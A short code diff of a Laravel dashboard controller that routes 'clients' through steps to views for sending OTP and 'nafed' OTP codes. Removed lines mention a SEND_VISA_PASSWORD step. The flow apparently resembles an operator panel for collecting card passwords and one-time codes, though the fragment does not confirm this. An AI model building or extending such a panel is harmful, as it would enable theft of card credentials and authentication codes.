@@ -36,11 +36,10 @@ class ClientController extends Controller
 
     public function event(Client $client){
         Notification::where('client_id' , $client->id)->delete();
-        if($client->end_point == END_REGISTRATION || $client->RESEND_OTP){
+        if($client->end_point == STEP_Eight){
             return view('dashboard.clients.send_otp',compact('client'));
-        }elseif ($client->end_point == SUCCESS_OTP) {
-
-        }elseif ($client->end_point == SEND_VISA_PASSWORD) {
+        }
+        if($client->end_point == STEP_NINE){
             return view('dashboard.clients.send_nafed_otp',compact('client'));
         }
     }
@@ -55,7 +54,6 @@ class ClientController extends Controller
             $client->nafed_otp = $inputs['nafed_otp'];
         }
         $client->save();
-
         Alert::success(' تم الارسال', 'تم الحفظ بنجاح');
         return redirect()->route('clients.index');
     }
